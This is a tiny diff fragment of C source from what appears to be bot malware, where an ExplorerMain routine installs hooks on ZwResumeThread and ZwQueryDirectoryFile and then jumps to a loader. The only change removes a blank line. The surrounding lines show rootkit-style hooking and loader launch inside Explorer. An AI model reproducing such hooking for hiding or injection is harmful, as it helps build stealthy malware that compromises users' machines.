@@ -158,7 +158,6 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 	HookZwResumeThread();
 	HookZwQueryDirectoryFile();
 
-
 	DLLDBG("====>Bot DLL", "Стартуем Loader ()");
 	MegaJump( LoaderRoutine );
 
